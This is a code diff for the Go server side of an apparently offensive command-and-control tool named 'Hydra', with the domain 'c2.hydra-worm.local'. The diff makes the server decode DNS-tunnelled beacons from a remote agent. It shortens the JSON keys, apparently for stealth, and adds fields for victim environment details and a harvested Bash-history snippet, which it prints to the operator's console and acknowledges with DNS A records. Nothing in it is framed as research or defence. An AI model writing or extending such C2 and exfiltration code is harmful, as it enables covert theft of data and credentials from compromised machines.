@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
@@ -22,13 +23,15 @@ const rootDomain = "c2.hydra-worm.local."
 // Telemetry represents the data structure expected from the Rust Agent
 // Enhanced to support Sprint 2: Recon Pillars I - VII
 type Telemetry struct {
-	AgentID   string  `json:"agent_id"`
-	Transport string  `json:"transport"`
-	Status    string  `json:"status"`
-	Lambda    float64 `json:"lambda"`
-	Hostname  string  `json:"hostname,omitempty"`
-	Username  string  `json:"username,omitempty"`
-	OS        string  `json:"os,omitempty"`
+	AgentID   string  `json:"a"`
+	Transport string  `json:"t"`
+	Status    string  `json:"s"`
+	Lambda    float64 `json:"l"`
+	Hostname  string  `json:"h"`
+	Username  string  `json:"u"`
+	OS        string  `json:"o"`
+	EnvContext string `json:"e"`
+	ArtifactPreview string `json:"p"`
 }
 
 // RenderVaporBanner displays the header-based banner with the tactical aesthetic
@@ -64,24 +67,29 @@ func RenderVaporBanner() {
 }
 
 // LogHeartbeat provides consistent, colored feedback like VaporTrace
-func LogHeartbeat(source string, t Telemetry) {
-	transportColor := pterm.LightCyan
-	if source == "DNS" {
-		transportColor = pterm.LightMagenta
-	}
-
-	// Correct pterm style instantiation
-	sourceText := pterm.NewStyle(pterm.FgCyan, pterm.Bold).Sprint(source)
+func LogHeartbeat(transport string, t Telemetry) {
+	timestamp := time.Now().Format("15:04:05")
 	
-	pterm.Printf("[%s] %s | %s: %-15s | %s: %-12s | %s: %s@%s\n",
-		pterm.Gray(time.Now().Format("15:04:05")),
-		sourceText,
-		pterm.LightBlue("ID"), t.AgentID,
-		transportColor("TRANS"), t.Transport,
-		pterm.LightGreen("USER"), t.Username, t.Hostname,
-	)
+	// Create the header line with user and environment context
+	header := fmt.Sprintf("[%s] %s | ID: %s | USER: %s@%s | ENV: %s",
+		pterm.Gray(timestamp),
+		pterm.LightCyan(transport),
+		pterm.LightWhite(t.AgentID),
+		pterm.LightMagenta(t.Username),
+		pterm.LightMagenta(t.Hostname),
+		pterm.Yellow(t.EnvContext))
+	
+	pterm.Println(header)
+
+	// Display the harvested artifact (Bash history snippet)
+	if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
+		pterm.Printf("      └─ %s %s\n", 
+			pterm.LightRed("RECON:"), 
+			pterm.Italic.Sprint(t.ArtifactPreview))
+	}
 }
 
+// parseHydraDNS handles incoming DNS Tunneling heartbeats
 // parseHydraDNS handles incoming DNS Tunneling heartbeats
 func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
 	msg := new(dns.Msg)
@@ -93,30 +101,31 @@ func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
 		cleanRoot := strings.TrimSuffix(rootDomain, ".")
 
 		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
+			// 1. Extract and Reassemble: Remove dots to rebuild original Base64
 			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
-			encodedPayload := strings.ReplaceAll(payloadPart, ".", "")
+			encodedPayload := strings.ReplaceAll(payloadPart, ".", "") // STITCHING STEP
 			
-			if i := len(encodedPayload) % 4; i != 0 {
-				encodedPayload += strings.Repeat("=", 4-i)
-			}
+			// 2. Normalize and Pad
+			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
+			normalized = strings.ReplaceAll(normalized, "_", "/")
+			for len(normalized)%4 != 0 { normalized += "=" }
 
-			decoded, err := base64.URLEncoding.DecodeString(encodedPayload)
+			// 3. Decode
+			decoded, err := base64.StdEncoding.DecodeString(normalized)
 			if err != nil {
-				decoded, err = base64.StdEncoding.DecodeString(encodedPayload)
-				if err != nil {
-					log.Printf("[-] DNS Decode Error: %v", err)
-					continue
-				}
+				decoded, _ = base64.URLEncoding.DecodeString(normalized)
 			}
 
+			// 4. Log and Acknowledge
 			if decoded != nil {
-				LogHeartbeat("DNS", Telemetry{
-					AgentID:   "HYDRA-AGENT-01", 
-					Transport: "DNS-Tunnel",
-					Username:  "unknown",
-					Hostname:  "unknown",
-				})
-				pterm.Println(pterm.Gray(fmt.Sprintf("      └─ [RAW]: %s", string(decoded))))
+				var t Telemetry
+				if err := json.Unmarshal(decoded, &t); err == nil {
+					LogHeartbeat("DNS", t) // Feedback returns to the UI
+					
+					// 5. Send A-Record ACK back to Agent
+					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
+					msg.Answer = append(msg.Answer, rr)
+				}
 			}
 		}
 	}
